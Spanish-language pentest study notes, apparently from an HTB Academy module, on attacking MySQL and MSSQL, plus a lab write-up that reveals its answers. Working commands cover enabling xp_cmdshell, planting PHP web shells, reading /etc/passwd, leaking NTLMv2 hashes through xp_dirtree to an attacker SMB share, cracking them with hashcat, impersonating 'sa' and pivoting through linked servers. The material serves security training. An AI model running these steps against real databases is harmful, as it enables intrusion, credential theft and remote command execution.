MySQL y Microsoft SQL Server ( MSSQL) son sistemas de gestión de bases de datos relacionales que almacenan datos en tablas, columnas y filas. 
Utilizan el "Structured Query Language" (SQL).
Una base de datos relacional es aquella que guarda la información de una forma estructurada en columnas y filas.

Tanto MySQL como Microsoft SQL Server (MSSQL) son Sistemas Gestores de Bases de Datos Relacionales (RDBMS).
Es decir, son programas/servicios que guardan datos en tablas y usan el lenguaje SQL para consultar o modificar esos datos.

Los hosts de bases de datos se consideran objetivos prioritarios, ya que son responsables de almacenar todo tipo de datos confidenciales, incluyendo, entre otros, credenciales de usuario, datos comerciales e información de pago. 

Además, estos servicios suelen estar configurados con usuarios con privilegios elevados. 
Si obtenemos acceso a una base de datos, podríamos aprovechar esos privilegios para realizar más acciones, como el movimiento lateral y la escalada de privilegios.

---

### Enumeración

MSSQL usa los puertos TCP/1433y UDP/1434, y MySQL usa puerto TCP/3306. 
Sin embargo, cuando MSSQL opera en modo oculto, usa el puerto TCP/2433. 
Podemos usar la opción Nmap de scripts predeterminados "-sC" para enumerar los servicios de base de datos en un sistema de destino:


```shell-session
Polika4RM@htb[/htb]$ nmap -Pn -sV -sC -p1433 10.10.10.125

Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-26 02:09 BST
Nmap scan report for 10.10.10.125
Host is up (0.0099s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: HTB
|   NetBIOS_Domain_Name: HTB
|   NetBIOS_Computer_Name: mssql-test
|   DNS_Domain_Name: HTB.LOCAL
|   DNS_Computer_Name: mssql-test.HTB.LOCAL
|   DNS_Tree_Name: HTB.LOCAL
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2021-08-26T01:04:36
|_Not valid after:  2051-08-26T01:04:36
|_ssl-date: 2021-08-26T01:11:58+00:00; +2m05s from scanner time.

Host script results:
|_clock-skew: mean: 2m04s, deviation: 0s, median: 2m04s
| ms-sql-info: 
|   10.10.10.125:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
```


---
## Mecanismos de autenticación de servidor MSSQL
MSSQL tiene una **configuración interna** (en el propio servidor) que define _cómo pueden iniciar sesión los usuarios_.  
Esa configuración tiene **dos posibles modos**:
#### 1. **Windows Authentication Mode (solo Windows)**
También llamado **“Windows only”** (solo Windows).
- El servidor _no acepta_ usuarios creados dentro de SQL Server (los “SQL logins”).
- Solo pueden conectarse usuarios que existan en **Windows** o en **Active Directory**.
  O cuantas locales del equipo (almacenadas en la SAM local) o cuentas del dominio (= Active Directory)
	- Las cuentas del equipo se representan de la siguiente forma:
		- SERVIDOR01\usuarioLocal  (o lo que es lo mismo:  .\usuarioLocal)
	- Las cuentas de Active Directory se representan con:
		- DOMINIO\usuarioAD
**Ejemplo práctico:**
- Si en el servidor existe el usuario de Windows `ACME\julio`, este usuario puede conectarse a SQL Server sin necesidad de escribir otra contraseña (porque ya está autenticado en Windows).
- Pero si intentas conectarte como `-U julio -P algo`, no funcionará, porque `julio` no existe como usuario de Windows.
Piensa en esto como “el servidor confía solo en Windows para validar quién eres”.
#### 2. **Mixed Mode Authentication (modo mixto)**
- El servidor acepta **dos tipos de usuarios**:
    1. **Usuarios de Windows / Active Directory** (`DOMINIO\usuario` o `.\usuario`)
    2. **Usuarios propios de SQL Server** (definidos dentro del motor SQL, por ejemplo `sa`, `htbdbuser`, `julio`, etc.)
       Los SQL logins se guardan dentro de la bas de datos del sistema llamada master,
- Puedes conectarte como:
	- `-U DOMINIO\\julio -P pass` (cuenta Windows)  
    o  
    - `-U julio -P pass` (cuenta SQL creada dentro del servidor).
##### Resumen visual

|Modo de autenticación del servidor|Quién puede entrar|Ejemplo de login válido|
|---|---|---|
|**Windows only**|Solo usuarios de Windows o AD|`-U DOMINIO\\usuario` o `-U .\\usuario`|
|**Mixed mode**|Usuarios de Windows **y** usuarios SQL|`-U DOMINIO\\usuario` **o** `-U usuarioSQL`|

---
#### MySQL - Connecting to the SQL Server

MySQL es un sistema gestor de bases de datos relacional (RDBMS). Es un programa (un servicio) que almacena datos en tablas, responde a consultas SQL y gestiona usuarios, permisos y transacciones.

Para conectarnos a un servidor MySQL utilizaremos:
```shell-session
Polika4RM@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13

Welcome to the MariaDB monitor. Commands end with ; or \g.
Your MySQL connection id is 8
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MySQL [(none)]>
```

---
#### Sqlcmd - Connecting to the SQL Server

Sqlcmd es una herramienta cliente de Microsoft para conectarte a un Miscrosoft SQL Server (MSSQL)
No es el servidor, sino la herramienta con la que enviaré consultas.
Para interactuar desde una máquina Windows, ejecutaré el comando:
```cmd-session
C:\htb> sqlcmd -S SRVMSSQL -U julio -P 'MyPassword!' -y 30 -Y 30

1>
```

 En el caso de que querramos partir de una máquina Linux, utilizaremos "sqsh" como alternativa a "sqlcmd":
 
```shell-session
Polika4RM@htb[/htb]$ sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

Como alternativa, también podríamos utilizar la herramienta de Impacket llamada "mssqlclient.py":
```shell-session
Polika4RM@htb[/htb]$ mssqlclient.py -p 1433 julio@10.129.203.7 

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

Password: MyPassword!

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: None, New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(WIN-02\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL> 
```

Los clientes de MSSQL determinan si quiero usar autenticación Windows o autenticación SQL según cómo escriba el usuario.
Si el usuario tiene una barra invertida \ (DOMINIO\usuario o SERVIDOR\usuario o .\usuario) el cliente interpreta que quieres usar una cuenta de Windows. Si pones solo usuario, se interpreta como login SQL.

- `DOMINIO\juan` → **cuenta de dominio** (Active Directory) → Windows Authentication.
- `SERVIDOR01\juan` o `.\juan` → **cuenta local del servidor** (el `.` significa “este equipo”) → Windows Authentication (local).
- `juan` (sin `\`) → **login SQL** interno del motor (SQL Authentication).

El servidor/cliente siguen la convención `principal\account`. 
Cuando ven la \\, interpretan que “esto no es un login SQL; es una identidad de Windows que debe validarse por el sistema operativo (Kerberos/NTLM)”.

En el siguiente ejemplo vemos como el comando usa una cuenta local del servidor Windows donde corre el SQL Server:
```shell-session
Polika4RM@htb[/htb]$ sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h

sqsh-2.5.16.1 Copyright (C) 1995-2001 Scott C. Gray
Portions Copyright (C) 2004-2014 Michael Peppler and Martin Wesdorp
This is free software with ABSOLUTELY NO WARRANTY
For more information type '\warranty'
1>
```

---
### Bases de datos predeterminadas de SQL
Antes de explorar el uso de la sintaxis SQL, es fundamental conocer las bases de datos predeterminadas de MySQL y MSSQL. 

Estas bases de datos contienen información sobre la propia base de datos y nos ayudan a enumerar nombres, tablas, columnas, etc. 
Con acceso a estas bases de datos, podemos usar algunos procedimientos almacenados del sistema, pero generalmente no contienen datos de la empresa.

MySQL utiliza por defecto:
- mysql: 
	es la base de datos del sistema que contiene las tablas que almacenan la información requerida por el servidor MySQL.
- information_schema: 
	proporciona acceso a los metadatos de la base de datos.
- performance_schema: 
	es una función para supervisar la ejecución del servidor MySQL a bajo nivel.
- sys: 
	un conjunto de objetos que ayuda a los administradores de bases de datos (DBA) y desarrolladores a interpretar los datos recopilados por el esquema de rendimiento.

MSSQL utiliza por defecto:
- master: 
	almacena la información de una instancia de SQL Server.
- msdb:
	utilizado por el Agente SQL Server. Modelo: una base de datos de plantilla que se copia para cada nueva base de datos.
- resource: 
	una base de datos de solo lectura que mantiene los objetos del sistema visibles en todas las bases de datos del servidor en el esquema sys.
- Tempdb: 
	mantiene objetos temporales para consultas SQL.

---

## Sintaxi de SQL

#### 1. Mostrar bases de datos
Para bases de datos MYSQL, con el comando "SHOW DATABASES;" puedo ver las bases de datos:
```shell-session
mysql> SHOW DATABASES;

+--------------------+
| Database           |
+--------------------+
| information_schema |
| htbusers           |
+--------------------+
2 rows in set (0.00 sec)
```

Por otro lado, para MSSQL (microsoft SQL SERVER) puedo utilizar:
```cmd-session
1> SELECT name FROM master.dbo.sysdatabases
2> GO

name
--------------------------------------------------
master
tempdb
model
msdb
htbusers
```

#### 2. Seleccionamos una base de Datos:

Para MYSQL:
```shell-session
mysql> USE htbusers;

Database changed
```

Para MSSQL (con sqlcmd):
```cmd-session
1> USE htbusers
2> GO

Changed database context to 'htbusers'.
```

#### 3. Mostrar tablas
Para MYSQL:
```shell-session
mysql> SHOW TABLES;

+----------------------------+
| Tables_in_htbusers         |
+----------------------------+
| actions                    |
| permissions                |
| permissions_roles          |
| permissions_users          |
| roles                      |
| roles_users                |
| settings                   |
| users                      |
+----------------------------+
8 rows in set (0.00 sec)
```

Para MSSQL (con sqlcmd):
```cmd-session
1> SELECT table_name FROM htbusers.INFORMATION_SCHEMA.TABLES
2> GO

table_name
--------------------------------
actions
permissions
permissions_roles
permissions_users
roles      
roles_users
settings
users 
(8 rows affected)
```

#### 4. Seleccionar todos los datos de la tabla "users"

Para MYSQL:
```shell-session
mysql> SELECT * FROM users;

+----+---------------+------------+---------------------+
| id | username      | password   | date_of_joining     |
+----+---------------+------------+---------------------+
|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
|  3 | john          | john123!   | 2020-07-02 11:47:16 |
|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
+----+---------------+------------+---------------------+
4 rows in set (0.00 sec)
```

Para MSSQL (con sqlcmd):
```cmd-session
1> SELECT * FROM users
2> go

id          username             password         data_of_joining
----------- -------------------- ---------------- -----------------------
          1 admin                p@ssw0rd         2020-07-02 00:00:00.000
          2 administrator        adm1n_p@ss       2020-07-02 11:30:50.000
          3 john                 john123!         2020-07-02 11:47:16.000
          4 tom                  tom123!          2020-07-02 12:23:16.000

(4 rows affected)
```

---

### EJECUTANDO COMANDOS sobre bases de datos SQL

Si sobre una base de datos se tienen los privilegios adecuados, se puede usar la base de datos SQL para ejecutar comandos del sistema o crear los elementos necesarios.

### xp_cmdshell en servidor MSSQL
**MSSQL cuenta con "xp_cmdshell".**
Esto permite ejecutar comandos del sistema operativo (cmd.exe en Windows) desde una sesión SQL.
Es decir, una consulta SQL puede llegar a pedir al servidor que ejecute por mi "whoami" o "dir C:\\"
- Esta función está desactivada por defecto. Se activa/desactiva con "sp_configure". `sp_configure` es un procedimiento almacenado del propio servidor SQL que permite ver y cambiar opciones de configuración del servidor. 
- Los comandos se ejecutan con los mismos permisos que la cuenta de servicio de SQL Server.
- Funciona de forma síncrona → la sesión SQL espera a que el comando termine antes de continuar. 

Para ejecutar comandos sobre un servidor MSSQL con sintaxi SQL, utilizaremos:
```cmd-session
1> xp_cmdshell 'whoami'
2> GO

output
-----------------------------
no service\mssql$sqlexpress
NULL
(2 rows affected)
```

Si "xp_cmdshell" no estuviese disponible, desde "sqlcmd" debería ejecutar:

```
1> EXEC sp_configure 'show advanced options', 1
2> GO
1> RECONFIGURE
2> GO
1> EXECUTE sp_configure 'xp_cmdshell', 1
2> GO
1> RECONFIGURE
2> GO
```

---

## Escribir Local Files
MySQL no cuenta con un procedimiento almacenado como xp_cmdshell, pero podemos ejecutar comandos si escribimos en una ubicación del sistema de archivos que pueda ejecutar nuestros comandos. 

Por ejemplo, supongamos que MySQL opera en un servidor web basado en PHP u otros lenguajes de programación como ASP.NET. 
Si tenemos los privilegios adecuados, podemos intentar escribir un archivo usando SELECT INTO OUTFILE en el directorio del servidor web. Luego, podemos buscar la ubicación del archivo y ejecutar nuestros comandos.

En el siguiente ejemplo podemos ver como podemos crear archivos maliciosos:
```shell-session
mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';

Query OK, 1 row affected (0.001 sec)
```
Cuando un navegador solicite ese archivo vía HTTP (por ejemplo `http://servidor/webshell.php?c=whoami`), el servidor web **ejecutará** el código PHP.

##### Restricciones de escritura de archivos en MySQL
En MySQL, la variable global del sistema secure_file_priv limita el efecto de las operaciones de importación y exportación de datos, como las realizadas por las sentencias LOAD DATA y SELECT … INTO OUTFILE, y la función LOAD_FILE(). Estas operaciones solo están permitidas a los usuarios con el privilegio FILE.

El "secure_file_priv" puede configurarse de la siguiente manera:

- Si está vacía, la variable no tiene efecto, lo cual no constituye una configuración segura.
- Si se configura con el nombre de un directorio, el servidor limita las operaciones de importación y exportación para que solo funcionen con los archivos de ese directorio. El directorio debe existir; el servidor no lo crea.
- Si se configura con NULL, el servidor deshabilita las operaciones de importación y exportación.

En el siguiente ejemplo vemos como la variable "secure_file_priv" está vacía, pues, podremos leer y escribir datos usando MySQL:
```shell-session
mysql> show variables like "secure_file_priv";

+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+

1 row in set (0.005 sec)
```


### MSSQL - Permitiendo "OLE AUTOMATION PROCEDURES"
Para escribir archivos usando MSSQL, necesitaremos permitir el "Ole Automation Procedures", el cual requiere permisos de administrador. 
Para hacerlo, ejecutaremos:
```cmd-session
1> sp_configure 'show advanced options', 1
2> GO
3> RECONFIGURE
4> GO
5> sp_configure 'Ole Automation Procedures', 1
6> GO
7> RECONFIGURE
8> GO
```

Y seguidamente, ejecutaremos la "webshell" con:
```cmd-session
1> DECLARE @OLE INT
2> DECLARE @FileID INT
3> EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
4> EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
5> EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
6> EXECUTE sp_OADestroy @FileID
7> EXECUTE sp_OADestroy @OLE
8> GO
```


### MSSQL: Leyendo archivos
Para leer el contenido de un archivo de sistema directamente desde SQL Server, puedo utilizar:
```cmd-session
1> SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
2> GO

BulkColumn

-----------------------------------------------------------------------------
# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to hostnames. Each
# entry should be kept on an individual line. The IP address should

(1 rows affected)
```

### MySQL: Leyendo archivos
Podemos leer archivos utilizando el siguiente comando:

```shell-session
mysql> select LOAD_FILE("/etc/passwd");

+--------------------------+
| LOAD_FILE("/etc/passwd")
+--------------------------------------------------+
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync

<SNIP>
```

---

## CAPTURANDO Hash de MSSQL

Objetivo del atacante: 
	forzar al servicio MSSQL a autenticarse contra un servidor SMB controlado por el atacante. Cuando Windows intenta conectarse a un recurso SMB, normalmente envía un mensaje de autenticación (NTLMv2) que contiene información que puede capturar el atacante (el "hash" NTLMv2).

Si logro que el servicio MSSQL intente listar un recurso \\\host\share\\, el sistema Windows donde corre SQL intentará autenticarse usando la cuenta de servicio que ejecuta SQL (o la cuenta de la máquina). Esa autenticación es la que el atacante captura.


**xp_dirtree y xp_subdirs** son procedimientos extendidos en SQL Server que piden al sistema operativo que liste directorios de una ruta dada.
Si la ruta especificada es una ruta UNC (\\\IP\share\\\), SQL Server (el proceso en Windows) intentará conectarse a esa ruta remoto usando el subsistema SMB de Windows.

Resultado: Windows inicia una conexión SMB hacia esa dirección y envía credenciales (NTLMv2 challenge/response) si hace falta. Esa autenticación es la “cosa” que el atacante quiere capturar.
#### Robo de Hash XP_DIRTREE 
xp_dirtree: Lista carpetas y (opcionalmente) archivos de una carpeta dada de forma recursiva. Usado legítimamente para construir listados de directorios desde SQL.
```cmd-session
1> EXEC master..xp_dirtree '\\10.10.110.17\share\'
2> GO

subdirectory    depth
--------------- -----------
```

#### Robo de Hash  XP_SUBDIRS 
xp_subdirs: Devuelve solo las subcarpetas de primer nivel del directorio indicado (es decir, análogo a xp_dirtree con profundidad = 1). Es básicamente una versión más limitada/rápida.
```cmd-session
1> EXEC master..xp_subdirs '\\10.10.110.17\share\'
2> GO

HResult 0x55F6, Level 16, State 1
xp_subdirs could not access '\\10.10.110.17\share\*.*': FindFirstFile() returned error 5, 'Access is denied.'
```

Si la cuenta de servicio tiene acceso a nuestro servidor, obtendremos su hash. Luego, podremos intentar descifrarlo o retransmitirlo a otro host.

#### XP_SUBDIRS robo de HASH con Responder
Con un Responder, podemos robar el Hash:
```shell-session
Polika4RM@htb[/htb]$ sudo responder -I tun0

                                         __               
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|              
<SNIP>

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.110.17
[SMB] NTLMv2-SSP Username : SRVMSSQL\demouser
[SMB] NTLMv2-SSP Hash     : demouser::WIN7BOX:5e3ab1c4380b94a1:A1... ...0000000000000
```

O lo mismo con Impacket: 


#### XP_SUBDIRS robo de HASH con Impacket
```shell-session
Polika4RM@htb[/htb]$ sudo impacket-smbserver share ./ -smb2support

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 
[*] Config file parsed                                                 
[*] Config file parsed                                                 
[*] Config file parsed
[*] Incoming connection (10.129.203.7,49728)
[*] AUTHENTICATE_MESSAGE (WINSRV02\mssqlsvc,WINSRV02)
[*] User WINSRV02\mssqlsvc authenticated successfully                        
[*] demouser::WIN7BOX:5e3ab1c4380b94a1:A18830632D52768440B7E2425C4A7107:01... ...E006700730061000000000000000000
[*] Closing down connection (10.129.203.7,49728)                      
[*] Remaining connections []
```

---

# Suplantación de usuarios existentes con MSSQL
SQL Server cuenta con un permiso especial, denominado IMPERSONATE, que permite al usuario que ejecuta la ejecución asumir los permisos de otro usuario o iniciar sesión hasta que se restablezca el contexto o finalice la sesión. 
Con esto, podemos llevar a cabo una escalada de privilegios:

Primero, debemos identificar a los usuarios que podemos suplantar. Los administradores de sistemas pueden suplantar a cualquiera de forma predeterminada, pero para los usuarios que no son administradores, los privilegios deben asignarse explícitamente. Podemos usar la siguiente consulta para identificar a los usuarios que podemos suplantar:

```cmd-session
1> SELECT distinct b.name
2> FROM sys.server_permissions a
3> INNER JOIN sys.server_principals b
4> ON a.grantor_principal_id = b.principal_id
5> WHERE a.permission_name = 'IMPERSONATE'
6> GO

name
-----------------------------------------------
sa
ben
valentin

(3 rows affected)
```


### Verificación del rol del Usuario actual
Para tener una idea de las posibilidades de escalada de privilegios, verifiquemos si nuestro usuario actual tiene el rol de administrador del sistema:
Ejecutaremos el comando:

```cmd-session
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go

-----------
julio                                                                                                                    

(1 rows affected)

-----------
          0

(1 rows affected)
```

Como indica el valor 0 devuelto, no tenemos el rol de administrador de sistemas, pero podemos suplantar al usuario sa. Suplantaremos al usuario y ejecutaremos los mismos comandos. Para suplantar a un usuario, podemos usar la instrucción Transact-SQL EXECUTE AS LOGIN y asignarle el usuario que queremos suplantar:

## Suplantando a usuario "sa"

Suplantamos dicho usuario y verificamos si este tiene permisos de administrador:
```cmd-session
1> EXECUTE AS LOGIN = 'sa'
2> SELECT SYSTEM_USER
3> SELECT IS_SRVROLEMEMBER('sysadmin')
4> GO

-----------
sa

(1 rows affected)

-----------
          1

(1 rows affected)
```
Ahora podemos ejecutar cualquier comando como administrador de sistemas, como indica el valor devuelto 1. Para revertir la operación y volver a nuestro usuario anterior, podemos usar la instrucción Transact-SQL REVERT.

---
## Comunicarse con otras bases de datos con MSSQL

MSSQL cuenta con una opción de configuración llamada servidores vinculados. Estos servidores suelen configurarse para que el motor de base de datos pueda ejecutar una sentencia Transact-SQL que incluya tablas en otra instancia de SQL Server u otro producto de base de datos como Oracle.

Si logramos acceder a un servidor SQL Server con un servidor vinculado configurado, podremos acceder lateralmente a dicho servidor de base de datos. Los administradores pueden configurar un servidor vinculado con las credenciales del servidor remoto. Si estas credenciales tienen privilegios de administrador de sistemas, podremos ejecutar comandos en la instancia SQL remota. Veamos cómo podemos identificar y ejecutar consultas en servidores vinculados.

### Identificando servidores Linkeados en MSSQL
Ejecutaremos el comando:
```cmd-session
1> SELECT srvname, isremote FROM sysservers
2> GO

srvname                             isremote
----------------------------------- --------
DESKTOP-MFERMN4\SQLEXPRESS          1
10.0.0.12\SQLEXPRESS                0

(2 rows affected)
```

Como podemos ver en el resultado de la consulta, tenemos el nombre del servidor y la columna "isremote", donde 1 significa que es un servidor remoto y 0 que es un servidor vinculado. Para más información, podemos consultar sysservers en Transact-SQL.

A continuación, podemos intentar identificar el usuario utilizado para la conexión y sus privilegios. La sentencia EXECUTE permite enviar comandos de paso a servidores vinculados. Añadimos nuestro comando entre paréntesis y especificamos el servidor vinculado entre corchetes (\[ \]):

```cmd-session
1> EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
2> GO

------------------------------ ------------------------------ ------------------------------ -----------
DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote                                1

(1 rows affected)
```


Nota: Si necesitamos usar comillas en nuestra consulta al servidor vinculado, debemos usar comillas dobles simples para escapar las comillas simples. Para ejecutar varios comandos a la vez, podemos separarlos con punto y coma (;).

Como hemos visto, ahora podemos ejecutar consultas con privilegios de administrador de sistemas en el servidor vinculado. Como administrador de sistemas, controlamos la instancia de SQL Server. Podemos leer datos de cualquier base de datos o ejecutar comandos del sistema con xp_cmdshell. Esta sección abordó algunas de las formas más comunes de atacar bases de datos SQL Server y MySQL durante pruebas de penetración. Existen otros métodos para atacar estos tipos de bases de datos, así como otras, como PostGreSQL, SQLite, Oracle, Firebase y MongoDB, que se abordarán en otros módulos. Merece la pena dedicar un tiempo a informarse sobre estas tecnologías de bases de datos y algunas de las formas más comunes de atacarlas.

---
# Ejercicios
**Target: 10.129.203.12
Authenticate to 10.129.203.12 (ACADEMY-ATTCOMSVC-WIN-02) with user "htbdbuser" and password "MSSQLAccess01!"
**1. What is the password for the "mssqlsvc" user?

Con un escaneo básico de nmap, me encuentro:
```
sudo nmap -sC 10.129.203.12
... 

1433/tcp open  ms-sql-s
| ms-sql-info: 
|   10.129.203.12:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-10-17T06:39:16+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-17T06:37:46
|_Not valid after:  2055-10-17T06:37:46
| ms-sql-ntlm-info: 
|   10.129.203.12:1433: 
|     Target_Name: WIN-02
|     NetBIOS_Domain_Name: WIN-02
|     NetBIOS_Computer_Name: WIN-02
|     DNS_Domain_Name: WIN-02
|     DNS_Computer_Name: WIN-02
|_    Product_Version: 10.0.17763
```

Con esta información, veo que existe un servidor llamado "Microsoft SQL Server 2019 RTM" corriendo en el puerto TCP 1433.
Al tratarse de un servidor MSSQL, me descargaré la herramienta "mssqlclient.py" para poder interactuar con la base de datos.
Me descargo:
>https://github.com/fortra/impacket/blob/master/examples/mssqlclient.py

Y ejecuto:
```
mssqlclient.py -p 1433 htbdbuser@10.129.203.12

	Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 

	Password:    #indicando la contraseña MSSQLAccess01!
```


En una terminal aparte, me pongo en escucha con responder por la interfaz tun0:



Dentro de la base de datos, ejecuto:
```
SQL (htbdbuser  guest@master)> EXEC master..xp_dirtree '\\10.10.14.93\share\'
subdirectory   depth   
------------   -----   

```

Siendo  \\\\10.10.14.93\\ la IP de la máquina atacante.
```
sudo responder -I tun0
```


Con esto, recibo un HASH en el responder:

```
[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.129.203.12
[SMB] NTLMv2-SSP Username : WIN-02\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::WIN-02:0d6c4105de1c0fe5:14710EF402DCB650915C1523F44ECDE3:0101000000000000004E31300B3FDC01AAF6467C91D1A0CD0000000002000800360036004100530001001E00570049004E002D00460043004D003000440054005300520037004B00520004003400570049004E002D00460043004D003000440054005300520037004B0052002E0036003600410053002E004C004F00430041004C000300140036003600410053002E004C004F00430041004C000500140036003600410053002E004C004F00430041004C0007000800004E31300B3FDC01060004000200000008003000300000000000000000000000003000002C091A6D9674900B26A0E4BC5B01D846FE8533F26F796BB3EBFB624413F85CA80A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390033000000000000000000

```

Contenido que copio a un archivo llamado hash.txt:
```
hashid hash.txt 
--File 'hash.txt'--
Analyzing 'mssqlsvc::WIN-02:0d6c4105de1c0fe5:14710EF402DCB650915C1523F44ECDE3:0101000000000000004E31300B3FDC01AAF6467C91D1A0CD0000000002000800360036004100530001001E00570049004E002D00460043004D003000440054005300520037004B00520004003400570049004E002D00460043004D003000440054005300520037004B0052002E0036003600410053002E004C004F00430041004C000300140036003600410053002E004C004F00430041004C000500140036003600410053002E004C004F00430041004C0007000800004E31300B3FDC01060004000200000008003000300000000000000000000000003000002C091A6D9674900B26A0E4BC5B01D846FE8533F26F796BB3EBFB624413F85CA80A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390033000000000000000000'
[+] NetNTLMv2 

```

Y lo crackeo:
```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt.gz
```

Y retorna:
```
MSSQLSVC::WIN-02:0d6c4105de1c0fe5:14710ef402dcb650915c1523f44ecde3:0101000000000000004e31300b3fdc01aaf6467c91d1a0cd0000000002000800360036004100530001001e00570049004e002d00460043004d003000440054005300520037004b00520004003400570049004e002d00460043004d003000440054005300520037004b0052002e0036003600410053002e004c004f00430041004c000300140036003600410053002e004c004f00430041004c000500140036003600410053002e004c004f00430041004c0007000800004e31300b3fdc01060004000200000008003000300000000000000000000000003000002c091a6d9674900b26a0e4bc5b01d846fe8533f26f796bb3ebfb624413f85ca80a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00390033000000000000000000:princess1
```

Siendo la respuesta: princess1

**2. Enumerate the "flagDB" database and submit a flag as your answer.**
Ejecutaré:
```
sqsh -S 10.129.203.12 -U .\\mssqlsvc -P princess1
```

Y ejecutando:
``` 
1> USE flagDB
2> go
```

y seguidamente:
```
1> SELECT * FROM tb_flag
2> go
```

Nos devuelve la flag: 
```
HTB{!_l0v3_#4$#!n9_4nd_r3$p0nd3r}
```